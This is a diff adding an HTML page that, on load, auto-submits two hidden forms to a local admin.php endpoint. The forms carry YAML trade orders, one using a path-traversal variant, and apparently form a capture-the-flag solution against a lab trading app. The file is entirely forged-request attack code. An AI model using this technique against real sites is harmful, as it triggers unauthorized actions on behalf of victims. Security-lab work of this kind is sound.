@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+</head>
+<body>
+  <form id="f" action="http://localhost:5000/admin.php" method="POST">
+    <input type="hidden" name="url"
+      value="http://localhost:5000/index.php?html=- amount: 2000000
+  currency: ZZ
+  op: BUY
+- amount: 2000000
+  currency: ZZ
+  op: SELL
+- amount: 1
+  currency: FL
+  op: BUY">
+  </form>
+
+  <form id="f2" action="http://localhost:5000/admin.php" method="POST">
+    <input type="hidden" name="url"
+      value="http://localhost:5000/admin.php/../index.php?html=- amount: 2000000
+  currency: ZZ
+  op: BUY
+- amount: 2000000
+  currency: ZZ
+  op: SELL
+- amount: 1
+  currency: FL
+  op: BUY">
+  </form>
+
+  <script>
+    f.submit();  // Submit first payload
+    setTimeout(() => f2.submit(), 200);  // Submit second payload after delay
+  </script>
+</body>
+</html>
